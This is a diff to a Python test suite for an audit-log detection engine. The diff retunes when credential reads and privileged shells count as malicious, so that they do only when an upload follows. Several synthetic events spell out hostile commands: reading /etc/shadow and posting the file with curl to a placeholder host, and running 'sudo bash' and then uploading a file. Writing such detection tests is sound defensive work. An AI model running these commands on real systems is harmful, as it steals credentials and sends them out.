@@ -141,7 +141,7 @@ def test_cleanup_sensitive_archive_without_transfer_stays_benign() -> None:
     assert score < SCORING["score_threshold"]
 
 
-def test_credential_access_through_shell_is_strong_chain() -> None:
+def test_credential_shell_read_without_transfer_is_candidate_only() -> None:
     engine = RuleEngine(DEFAULT_RULES)
     events = [
         Event(
@@ -155,9 +155,10 @@ def test_credential_access_through_shell_is_strong_chain() -> None:
     hits, signals = engine.evaluate(events, {"http_post_count": 0, "dst_ports": []})
     score, label, _risk = score_hits(hits, SCORING, signals)
     assert "R109" in {hit.rule_id for hit in hits}
-    assert signals["strong_chain"] is True
-    assert label == 1
-    assert score >= SCORING["score_threshold"]
+    assert "R109" in signals["chain_candidates"]
+    assert signals["strong_chain"] is False
+    assert label == 0
+    assert score < SCORING["score_threshold"]
 
 
 def test_api_key_discussion_and_llm_paths_do_not_trigger_r109() -> None:
@@ -232,7 +233,37 @@ def test_r104_does_not_trigger_on_ordinary_token_substring_package() -> None:
     assert score < SCORING["score_threshold"]
 
 
-def test_shell_reading_shadow_still_triggers_r109() -> None:
+def test_audit_path_cwd_words_do_not_create_strong_archive_or_exfil() -> None:
+    engine = RuleEngine(DEFAULT_RULES)
+    events = [
+        Event(
+            md5="synthetic",
+            source="audit",
+            event_type="path",
+            text='type=PATH name="/workspace/archive/upload/credentials/readme.txt"',
+            fields={"name": "/workspace/archive/upload/credentials/readme.txt"},
+        ),
+        Event(
+            md5="synthetic",
+            source="audit",
+            event_type="cwd",
+            text='type=CWD cwd="/workspace/archive/upload"',
+            fields={"cwd": "/workspace/archive/upload"},
+        ),
+    ]
+    hits, signals = engine.evaluate(events, {"http_post_count": 0, "external_ip_count": 0, "dst_ports": []})
+    score, label, _risk = score_hits(hits, SCORING, signals)
+    rule_ids = {hit.rule_id for hit in hits}
+    assert "R002" in rule_ids
+    assert "R003" not in rule_ids
+    assert "R004" not in rule_ids
+    assert signals["real_command_context"] is False
+    assert signals["strong_chain"] is False
+    assert label == 0
+    assert score < SCORING["score_threshold"]
+
+
+def test_shell_reading_shadow_still_triggers_r109_but_needs_exfil_for_label() -> None:
     engine = RuleEngine(DEFAULT_RULES)
     events = [
         Event(
@@ -247,6 +278,34 @@ def test_shell_reading_shadow_still_triggers_r109() -> None:
     score, label, _risk = score_hits(hits, SCORING, signals)
     assert "R109" in {hit.rule_id for hit in hits}
     assert signals["credential_shell_access"] is True
+    assert signals["strong_chain"] is False
+    assert label == 0
+    assert score < SCORING["score_threshold"]
+
+
+def test_shell_reading_shadow_then_upload_is_label1() -> None:
+    engine = RuleEngine(DEFAULT_RULES)
+    events = [
+        Event(
+            md5="synthetic",
+            source="audit",
+            event_type="execve",
+            text='type=EXECVE a0="bash" a1="-lc" a2="grep root /etc/shadow > /tmp/shadow.txt"',
+            fields={"a0": "bash", "a1": "-lc", "a2": "grep root /etc/shadow > /tmp/shadow.txt"},
+        ),
+        Event(
+            md5="synthetic",
+            source="audit",
+            event_type="execve",
+            text='type=EXECVE a0="curl" a1="-F" a2="file=@/tmp/shadow.txt" a3="https://upload.invalid/u"',
+            fields={"a0": "curl", "a1": "-F", "a2": "file=@/tmp/shadow.txt", "a3": "https://upload.invalid/u"},
+        ),
+    ]
+    hits, signals = engine.evaluate(events, {"http_post_count": 0, "dst_ports": []})
+    score, label, _risk = score_hits(hits, SCORING, signals)
+    assert "R109" in {hit.rule_id for hit in hits}
+    assert signals["real_exfil"] is True
+    assert signals["strong_chain"] is True
     assert label == 1
     assert score >= SCORING["score_threshold"]
 
@@ -299,7 +358,7 @@ def test_sysmon_normal_app_network_is_label0(tmp_path) -> None:
     assert score < SCORING["score_threshold"]
 
 
-def test_privilege_shell_with_network_context_is_strong_chain() -> None:
+def test_privilege_shell_with_only_network_observed_is_candidate_not_label() -> None:
     engine = RuleEngine(DEFAULT_RULES)
     events = [
         Event(
@@ -315,11 +374,39 @@ def test_privilege_shell_with_network_context_is_strong_chain() -> None:
     score, label, _risk = score_hits(hits, SCORING, signals)
     assert "R110" in {hit.rule_id for hit in hits}
     assert signals["network_observed"] is True
+    assert signals["real_exfil"] is False
+    assert label == 0
+    assert score < SCORING["score_threshold"]
+
+
+def test_privilege_shell_with_real_upload_is_label1() -> None:
+    engine = RuleEngine(DEFAULT_RULES)
+    events = [
+        Event(
+            md5="synthetic",
+            source="audit",
+            event_type="execve",
+            text='type=EXECVE a0="sudo" a1="bash"',
+            fields={"a0": "sudo", "a1": "bash", "comm": "sudo"},
+        ),
+        Event(
+            md5="synthetic",
+            source="audit",
+            event_type="execve",
+            text='type=EXECVE a0="curl" a1="--upload-file" a2="/tmp/audit.txt" a3="https://upload.invalid/audit"',
+            fields={"a0": "curl", "a1": "--upload-file", "a2": "/tmp/audit.txt", "a3": "https://upload.invalid/audit"},
+        ),
+    ]
+    hits, signals = engine.evaluate(events, {"http_post_count": 0, "dst_ports": []})
+    score, label, _risk = score_hits(hits, SCORING, signals)
+    assert "R110" in {hit.rule_id for hit in hits}
+    assert signals["real_exfil"] is True
+    assert signals["strong_chain"] is True
     assert label == 1
     assert score >= SCORING["score_threshold"]
 
 
-def test_profiles_split_borderline_privilege_network_chain() -> None:
+def test_profiles_do_not_label_ordinary_privilege_network_observed() -> None:
     _precision_config, precision_rules = load_config("configs/default.yaml", profile="precision")
     _recall_config, recall_rules = load_config("configs/default.yaml", profile="recall")
     events = [
@@ -341,8 +428,8 @@ def test_profiles_split_borderline_privilege_network_chain() -> None:
     assert "R110" in {hit.rule_id for hit in precision_hits}
     assert precision_label == 0
     assert precision_score < _precision_config["scoring"]["score_threshold"]
-    assert recall_label == 1
-    assert recall_score >= _recall_config["scoring"]["score_threshold"]
+    assert recall_label == 0
+    assert recall_score < _recall_config["scoring"]["score_threshold"]
 
 
 def test_persistence_marker_without_command_context_stays_weak() -> None:
@@ -436,7 +523,7 @@ def test_balanced_credential_archive_post_promotes_but_precision_holds() -> None
     assert precision_score < _precision_config["scoring"]["score_threshold"]
 
 
-def test_balanced_sensitive_shell_suspicious_network_context_promotes() -> None:
+def test_balanced_sensitive_shell_suspicious_network_context_is_candidate_only() -> None:
     _balanced_config, balanced_rules = load_config("configs/default.yaml", profile="balanced")
     _precision_config, precision_rules = load_config("configs/default.yaml", profile="precision")
     events = [
@@ -456,14 +543,16 @@ def test_balanced_sensitive_shell_suspicious_network_context_promotes() -> None:
     precision_score, precision_label, _risk = score_hits(precision_hits, _precision_config["scoring"], precision_signals)
 
     assert "R114" in {hit.rule_id for hit in balanced_hits}
-    assert balanced_label == 1
-    assert balanced_score >= _balanced_config["scoring"]["score_threshold"]
+    assert "R114" in balanced_signals["chain_candidates"]
+    assert balanced_signals["strong_chain"] is False
+    assert balanced_label == 0
+    assert balanced_score < _balanced_config["scoring"]["score_threshold"]
     assert "R114" in {hit.rule_id for hit in precision_hits}
     assert precision_label == 0
     assert precision_score < _precision_config["scoring"]["score_threshold"]
 
 
-def test_balanced_credential_package_network_context_promotes() -> None:
+def test_balanced_credential_package_network_context_is_candidate_only() -> None:
     _balanced_config, balanced_rules = load_config("configs/default.yaml", profile="balanced")
     _precision_config, precision_rules = load_config("configs/default.yaml", profile="precision")
     events = [
@@ -490,8 +579,10 @@ def test_balanced_credential_package_network_context_promotes() -> None:
     precision_score, precision_label, _risk = score_hits(precision_hits, _precision_config["scoring"], precision_signals)
 
     assert "R115" in {hit.rule_id for hit in balanced_hits}
-    assert balanced_label == 1
-    assert balanced_score >= _balanced_config["scoring"]["score_threshold"]
+    assert "R115" in balanced_signals["chain_candidates"]
+    assert balanced_signals["strong_chain"] is False
+    assert balanced_label == 0
+    assert balanced_score < _balanced_config["scoring"]["score_threshold"]
     assert "R115" in {hit.rule_id for hit in precision_hits}
     assert precision_label == 0
     assert precision_score < _precision_config["scoring"]["score_threshold"]
